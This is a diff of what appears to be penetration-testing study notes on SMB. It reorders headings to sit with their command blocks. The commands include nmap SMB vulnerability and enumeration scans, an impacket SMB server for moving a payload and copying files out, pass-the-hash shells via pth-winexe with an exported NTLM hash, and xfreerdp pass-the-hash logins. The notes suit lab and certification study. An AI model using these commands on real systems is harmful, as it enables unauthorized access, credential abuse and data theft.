@@ -4,36 +4,6 @@ mount -t cifs "//10.11.1.49/admin$" /mnt/windows/ -o username=bethany\alice,doma
 
 ## SMB Enum
 
-
-## Fingerprint SMB version
-
-
-## Find open SMB Shares
-
-
-## Enumerate SMB Users
-
-
-## SMB Server
-
-
-## Pass the hash
-**SMB**
-In order to use pass the hash, we first need to put the hash in a env variable using the export command:
-
-
-So we will atuhenticate against a smb-service.
-
-
-I think you can run it like this too:
-
-
-**Remote Desktop**
-
-
-## Exploits
-EternalBlue (MS17-010)
-
 ```sh
 nmblookup -A 10.1.1.1
 
@@ -98,9 +68,17 @@ nmap -sSU -script smb-vuln\* -p U:137,T:139,445 --script-args=smbsign=disable,sm
 nmap -sSU -script smb-enum\* -p U:137,T:139,445 --script-args=smbuser=username,smbpass=password -oA 10.11.1.5_smbenum -vv -n -Pn 10.11.1.5
 ```
 
+
+## Fingerprint SMB version
+
 ```sh
 None
 ```
+
+
+## Find open SMB Shares
+
+
 
 ```sh
 nmap -oA 192.168.1.0_shares --script=smb-enum-shares --script-args=smbuser=username,smbpass=password -p445 192.168.1.0/24   
@@ -109,10 +87,16 @@ nmap -oA 192.168.1.0_shares --script=smb-enum-shares --script-args=smbuser=usern
 smbclient -L //192.168.1.100 -N
 #list shares with no password prompt
 ```
+## Enumerate SMB Users
+
+
 
 ```sh
 nmap --script=smb-enum-users -sSU -pU:137,T:139 -oA 192.168.1.200-254_smbusers 192.168.11.200-254 
 ```
+## SMB Server
+
+
 
 ```sh
 python /usr/share/doc/python-impacket/examples/smbserver.py probfine ./
@@ -123,18 +107,32 @@ copy \\10.1.1.1\probfine\payload .
 #Put
 copy C:\coolinfo \\10.1.1.1\probfine\
 ```
+## Pass the hash
+**SMB**
+In order to use pass the hash, we first need to put the hash in a env variable using the export command:
 
 ```sh
 export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
 ```
 
+
+So we will atuhenticate against a smb-service.
+
 ```sh
 pth-winexe -U administrator //192.168.1.101 cmd
 ```
 
+
+I think you can run it like this too:
+
+
+
 ```sh
 pth-winexe -U admin/hash:has //192.168.0.101 cmd
 ```
+**Remote Desktop**
+
+
 
 ```sh
 apt-get update
@@ -142,3 +140,5 @@ apt-get install freerdp-x11
 
 xfreerdp /u:admin /d:win7 /pth:hash:hash /v:192.168.1.101
 ```
+## Exploits
+EternalBlue (MS17-010)
